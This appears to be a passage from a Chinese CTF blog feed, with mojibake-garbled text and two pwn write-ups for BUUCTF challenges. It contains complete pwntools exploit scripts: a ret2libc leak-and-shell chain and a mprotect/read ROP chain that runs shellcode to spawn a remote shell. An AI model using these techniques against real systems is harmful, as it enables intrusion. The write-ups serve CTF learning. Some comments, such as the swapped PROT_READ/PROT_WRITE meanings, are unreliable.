<span class="title function_">begin</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Encrypt&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Decrypt&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Input your choice!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE                            hh      iii                &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to this Encryption machine\n&quot;</span>);</span><br><span class="line">  begin();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      fflush(<span class="number">0LL</span>);</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I think you can do it by yourself&quot;</span>);</span><br><span class="line">      begin();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    encrypt();</span><br><span class="line">    begin();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>æƒ¯ä¾‹checksec,åªå¼€å¯äº†NXå’Œéƒ¨åˆ†RELRO,ASLRä¸€èˆ¬ä¹Ÿé»˜è®¤å¼€å¯,çœäº†å¾ˆå¤šäº‹.ç¨‹åºç›¸å¯¹æœ‰ä¸€äº›å¤æ‚,å¤§æ¦‚åŠŸèƒ½æ˜¯åŠ å¯†å­—ç¬¦ä¸²ç„¶åæ‰“å°å‡ºæ¥,ä¹Ÿåªæœ‰è¿™ä¸€ä¸ªåŠŸèƒ½,åªæœ‰<code>encrypt()</code>å†…éƒ¨æœ‰<code>gets()</code>å’Œ<code>puts()</code>çš„æ¼æ´å¯ä»¥ä½¿ç”¨,ä¸ºäº†é¿å…æ„é€ æ ˆæº¢å‡ºæ¼æ´çš„æ—¶å€™payloadè¢«ç ´å,æ‰€ä»¥ç”¨ä¸‹é¢çš„ä¸€ä¸ªåˆ¤æ–­:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è®©payload,è®¾ç½®æˆ<code>'\x00'</code>å¼€å¤´å°±å¯ä»¥è·³è¿‡åŠ å¯†æ£€æŸ¥äº†,åé¢çš„è·å–shellçš„payloadä¹Ÿæ˜¯ä¸€æ¨¡ä¸€æ ·.</p><p>æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨<code>gets()</code>å’Œ<code>puts()</code>æ¥æ³„éœ²å‡ºgotè¡¨é‡Œçš„å‡½æ•°çœŸå®åœ°å€(<code>puts()</code>é€šè¿‡è§£ægotè¡¨é¡¹çš„åœ°å€ç„¶åæ‰“å°å‡ºæ¥),è¿™é‡Œè¿˜éœ€è¦è°ƒè¯•è·å¾—æ­£ç¡®çš„åœ°å€,å¤§æ¦‚æ˜¯<code>0x7f</code>å¼€å¤´.</p><p>ç„¶åå°±æ˜¯LibcSearcheræ¥æ‰¾glibcç‰ˆæœ¬,è¿™é‡Œæ³¨æ„libcç”¨dumpæ–¹æ³•æ¥æ‰¾å­—ä¸²ç”¨çš„æ˜¯â€™str_bin_shâ€™è¿™ä¸ª.ç„¶åå†è¿”å›<code>main()</code>å’ŒåŠ å¯†å‡½æ•°,å†æ„é€ payloadè·³è¿‡åŠ å¯†,è¦†ç›–è¿”å›åœ°å€ä¸º<code>system(&quot;bin/sh&quot;)</code>è·å¾—shell.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28118</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b main&#x27;)</span></span><br><span class="line">offset=<span class="number">0x50</span>+<span class="number">0x8</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_ret=<span class="number">0x400c83</span></span><br><span class="line">main=<span class="number">0x400b28</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+cyclic(offset-<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_ret)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choice!&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">io.recv(<span class="number">1</span>) </span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line"><span class="comment">#recv(8)ä¼šæŠŠåé¢çš„ä¸œè¥¿ä¹Ÿè¯»è¿›å»,è¿™é‡Œrecvè°ƒè¯•åˆ°åœ°å€å¼€å¤´æ˜¯7få°±å·®ä¸å¤šäº†,</span></span><br><span class="line"><span class="comment">#æœ‰æ•ˆåœ°å€ä¸€èˆ¬ä¹Ÿå°±12ä½çš„16è¿›åˆ¶å¤§å°</span></span><br><span class="line">info(<span class="string">&#x27;puts:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(puts_addr)))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment">#libcå†…æ‰¾å­—ç¬¦ä¸²ç”¨çš„æ–¹æ³•,æ–°ä¸œè¥¿</span></span><br><span class="line">ret=<span class="number">0x04006b9</span> <span class="comment">#ä¸ºäº†æ ˆå¹³è¡¡æ‰‹åŠ¨å‡ºæ ˆä¸€ä¸ª</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+cyclic(offset-<span class="number">1</span>)+p64(ret)</span><br><span class="line">payload+=p64(pop_ret)+p64(bin_sh)+p64(system)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choice!&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;
&lt;p&gt;ret2libc3åŠ ä¸Šä¸€ä¸ª&lt;code&gt;strlen()&lt;/code&gt;é‡åˆ°â€™&lt;code&gt;\x00&#39;&lt;/code&gt;å°±ä¼šåœä¸‹çš„çŸ¥è¯†ç‚¹,è¿˜æ˜¯æœ‰ä¸€äº›ç»†èŠ‚è¦æ³¨æ„çš„.&lt;/p&gt;
&lt;h2 id=&quot;1-ä¼ªä»£ç &quot;&gt;1.ä¼ªä»£ç &lt;/h2&gt;
&lt;figure cl</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>get_started_3dsctf_2016å¤ç°</title>
    <link href="https://www.fomal.cc/posts/b4e8d3.html"/>
    <id>https://www.fomal.cc/posts/b4e8d3.html</id>
    <published>2023-04-03T15:13:38.680Z</published>
    <updated>2023-04-09T06:22:25.578Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ‘˜è¦">æ‘˜è¦:</h2><p>è¿™é¢˜æ¶‰åŠåˆ°äº†x86å‡½æ•°è°ƒç”¨çº¦å®šçš„å†…å®¹,ç”±äºé¢˜ä¸»å¯¹cå’Œæ±‡ç¼–äº†è§£å¾—å¹¶æ²¡æœ‰éå¸¸æ·±å…¥,å¯¼è‡´é‡åˆ°äº†ç°å¸¸å¤šçš„å›°éš¾ğŸ˜­,æ•´åˆäº†å¾ˆå¤šå¸ˆå‚…çš„é¢˜è§£,çŸ¥è¯†ç‚¹æ€»ç»“åœ¨æœ€å.</p><h2 id="1-ä¼ªä»£ç ">1.ä¼ªä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">get_flag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">814536271</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = getc(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (<span class="type">char</span>)v3;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v4);</span><br><span class="line">        v5 = getc(v2);</span><br><span class="line">        v4 = (<span class="type">char</span>)v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v5 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No  found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.32, not stripped</span><br></pre></td></tr></table></figure><p>åªå¼€å¯äº†NXä¿æŠ¤,è€Œä¸”è¿˜æ˜¯é™æ€é“¾æ¥,åˆå­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºçš„æ¼æ´,å’Œåé—¨å‡½æ•°.å…ˆå…¥ä¸ºä¸»æƒ³æ„é€ æ ˆæº¢å‡ºæ¼æ´è·³è½¬åˆ°åé—¨å‡½æ•°æ‰“å°å‡ºflag,ä½†æ˜¯åœ¨ç”¨pythonå‘½ä»¤è¡Œæ¨¡å¼æµ‹è¯•çš„æ—¶å€™å‘ç°ç¨‹åºå¹¶ä¸ä¼šå®æ—¶è¾“å‡º,ä¹Ÿå°±æ˜¯è¦åœ¨ç¨‹åºå…³é—­çš„æ—¶å€™æ‰ä¼šè¾“å‡º.ä¸è¿‡è¿™ä¸ªæ— ä¼¤å¤§é›…,çœ‹äº†ä¸€ä¸‹<code>main</code>çš„æ±‡ç¼–:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public _start</span><br><span class="line">_start proc near</span><br><span class="line">xor     ebp, ebp</span><br><span class="line">pop     esi</span><br><span class="line">mov     ecx, esp</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">push    eax</span><br><span class="line">push    esp             ; stack_end</span><br><span class="line">push    edx             ; rtld_fini</span><br><span class="line">push    offset __libc_csu_fini ; fini</span><br><span class="line">push    offset __libc_csu_init ; init</span><br><span class="line">push    ecx             ; ubp_av</span><br><span class="line">push    esi             ; argc</span><br><span class="line">push    offset main     ; main</span><br><span class="line">call    __libc_start_main</span><br></pre></td></tr></table></figure><p>åœ¨è°ƒç”¨<code>main</code>æ—¶æŠŠ<code>ebp</code>å…ˆæ¸…é›¶,ç„¶ååªå‹å…¥äº†<code>esp</code>,ä¹Ÿå°±æ˜¯è¯´åœ¨<code>main</code>çš„æ ˆå¸§é‡Œä¸å­˜åœ¨æ‰€è°“çš„&quot;old ebp&quot;è¿™ä¸€è¯´,æ‰€ä»¥è¿™é‡Œçš„IDAç»™å‡ºçš„åç§»é‡ç›´æ¥ç”¨å°±å¥½äº†ä¸ç”¨åŠ 0x4.ç”±äºç¨‹åºæ˜¯é™æ€é“¾æ¥,å¹¶ä¸”åœ¨IDAé‡Œè¿˜æŸ¥åˆ°äº†<code>mprotect()</code>å‡½æ•°å¯ä»¥ç›´æ¥æŠŠå†…å­˜çš„ä¸€æ®µè½¬æ¢ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œ,PIEä¹Ÿæ²¡æœ‰å¼€,æ‰€ä»¥æ€è·¯ä»¥åŠåŸºæœ¬æœ‰äº†:</p><p>é¦–å…ˆæˆ‘ä»¬æ„é€ ROPé“¾,å…¶ä¸­åŒ…å«äº†<code>mprotect()</code>å’Œ<code>read()</code>,é…åˆ<code>pop ret</code>æ¥ä¿æŒæ ˆå¹³è¡¡ä»¥å¤šæ¬¡å®ç°ret(è¿™é‡Œæ˜¯ç¬”è€…æœ€è¿‘æ‰è§åˆ°çš„æ‰‹æ³•),ç”¨<code>read()</code>æŠŠshellcodeè¯»åœ¨è®¾ç½®æˆå¯ä»¥æ‰§è¡Œçš„.bssæ®µåŒºåŸŸç„¶åè¿”å›åœ°å€å¡«åœ¨shellcodeå­˜å‚¨çš„åœ°æ–¹å°±å¯ä»¥äº†,ä¸‹é¢æ˜¯ROPgadgetçš„ä½¿ç”¨å®ä¾‹.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./pwn --only <span class="string">&#x27;pop|ret&#x27;</span> |grep <span class="string">&#x27;pop&#x27;</span></span><br><span class="line">0x080483b8 : pop esi ; pop edi ; pop ebp ; ret</span><br></pre></td></tr></table></figure><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25712</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x38</span></span><br><span class="line">mprotect=elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">pop3_ret=<span class="number">0x080483b8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">bss=<span class="number">0x80ea000</span></span><br><span class="line">read=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">shellcode_addr=<span class="number">0x080EA000</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)</span><br><span class="line">payload+=p32(mprotect)+p32(pop3_ret)+p32(bss)+p32(<span class="number">0x10000</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line">payload+=p32(read)+p32(pop3_ret)+p32(<span class="number">0x0</span>)+p32(bss)+p32(<span class="number">0x200</span>)</span><br><span class="line">payload+=p32(shellcode_addr)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-æ€»ç»“">4.æ€»ç»“</h2><h3 id="1-ç¼“å†²åŒºé—®é¢˜">(1) ç¼“å†²åŒºé—®é¢˜</h3><p>æ²¡æœ‰æ³¨æ„åˆ°è¿™é“é¢˜ç›®å¹¶æ²¡æœ‰ä¸€ä¸ªåˆå§‹åŒ–çš„å‡½æ•°æ¥å…³é—­ç¼“å†²åŒº,ç¬”è€…åœ¨å‘½ä»¤è¡Œæ¥æ”¶çš„æ—¶å€™å°±å¡ä½äº†.</p><h3 id="2-main-å‡½æ•°çš„æ ˆå¸§é—®é¢˜">(2) main()å‡½æ•°çš„æ ˆå¸§é—®é¢˜</h3><p>å¯¹gdbè°ƒè¯•çš„ä¸ç†Ÿç»ƒåŠ ä¸Šå¯¹IDAçš„è¿‡åº¦ä¾èµ–,æ²¡æœ‰æ‰‹åŠ¨å»æµ‹è¯•å‡ºåç§»é‡çš„å¤§å°,å®é™…ä¸Š<code>main()</code>æ˜¯è°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‡½æ•°,æ­¤æ—¶<code>ebp</code>å†…è¿˜æ²¡æœ‰è¢«å‹å…¥æ ˆåŸºåœ°å€,æ‰€ä»¥å®é™…åç§»å¹¶ä¸ç”¨åŠ ä¸Š0x4</p><h3 id="3-mprotectå‡½æ•°åœ¨-bssçš„åˆ©ç”¨">(3) mprotectå‡½æ•°åœ¨.bssçš„åˆ©ç”¨</h3><p>è¿™ä¸ªå‡½æ•°çš„å¯ä»¥æŒ‡å®šä¸€æ®µå†…å­˜çš„æƒé™.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *start, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ç¬¬ä¸€ä¸ªå‚æ•°ï¼šéœ€æ”¹å†™å±æ€§çš„å†…å­˜ä¸­å¼€å§‹åœ°å€</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ç¬¬äºŒä¸ªå‚æ•°ï¼šéœ€æ”¹å†™å±æ€§çš„å†…å­˜é•¿åº¦</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ç¬¬/ä¸‰ä¸ªå‚æ•°ï¼šéœ€è¦èµ‹äºˆçš„æƒé™</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1ï¼‰PROT_READï¼šè¡¨ç¤ºå†…å­˜æ®µå†…çš„å†…å®¹å¯å†™ï¼›</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2ï¼‰PROT_WRITEï¼šè¡¨ç¤ºå†…å­˜æ®µå†…çš„å†…å®¹å¯è¯»ï¼›</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3ï¼‰PROT_EXECï¼šè¡¨ç¤ºå†…å­˜æ®µä¸­çš„å†…å®¹å¯æ‰§è¡Œï¼›</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4ï¼‰PROT_NONEï¼šè¡¨ç¤ºå†…å­˜æ®µä¸­çš„å†…å®¹æ ¹æœ¬æ²¡æ³•è®¿é—®ã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">æ³¨æ„ï¼šæŒ‡å®šçš„å†…å­˜åŒºé—´å¿…é¡»åŒ…å«æ•´ä¸ªå†…å­˜é¡µï¼ˆ4Kï¼‰ã€‚åŒºé—´å¼€å§‹çš„åœ°å€startå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œå¹¶ä¸”åŒºé—´é•¿åº¦lenå¿…é¡»æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Prot=7 æ˜¯å¯è¯»å¯å†™å¯æ‰§è¡Œçš„æœ€é«˜æƒé™</span></span><br><span class="line"><span class="comment">ä¸€èˆ¬ç”¨äºåœ¨åˆ©ç”¨shellcodeæ–¹å¼è¿›è¡Œæ ˆæº¢å‡ºæ—¶ï¼Œä½†æ˜¯bssæ®µæ²¡æœ‰è¶³å¤Ÿçš„æƒé™æ¥å†™å…¥shellcodeæ—¶ï¼Œå¯ä»¥åˆ©äºmprotectå‡½æ•°æ¥æ”¹å†™bssæ®µçš„æƒé™</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="4-32ä½å‡½æ•°è¿ç»­æ§åˆ¶æ‰§è¡Œæµ">(4) 32ä½å‡½æ•°è¿ç»­æ§åˆ¶æ‰§è¡Œæµ</h3><p>å¦‚æœè¦è¿ç»­æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµ,å°±è¦ä¿æŒæ ˆçš„å¹³è¡¡,ä½†retçš„ROPé“¾æ˜¯æˆ‘ä»¬æ‰‹åŠ¨æ„é€ çš„,é‚£ä¹ˆå°±éœ€è¦åœ¨ç»“æŸè°ƒç”¨å‡½æ•°æ—¶æ‰‹åŠ¨æ¸…ç©º.x86å‡½æ•°çš„å‚æ•°éƒ½åœ¨æ ˆä¸Š,æ‰€ä»¥æˆ‘ä»¬çš„è¿”å›åœ°å€ä¸åº”ç›´æ¥å¡«å†™ä¸‹ä¸€ä¸ªå‡½æ•°,è€Œæ˜¯ä¸€ä¸²popæŒ‡ä»¤çš„åŠ retçš„åœ°å€,popçš„ä¸ªæ•°å–å†³äºç»™å½“å‰å‡½æ•°å‹å…¥æ ˆä¸­çš„å‚æ•°çš„ä¸ªæ•°,è¿™æ 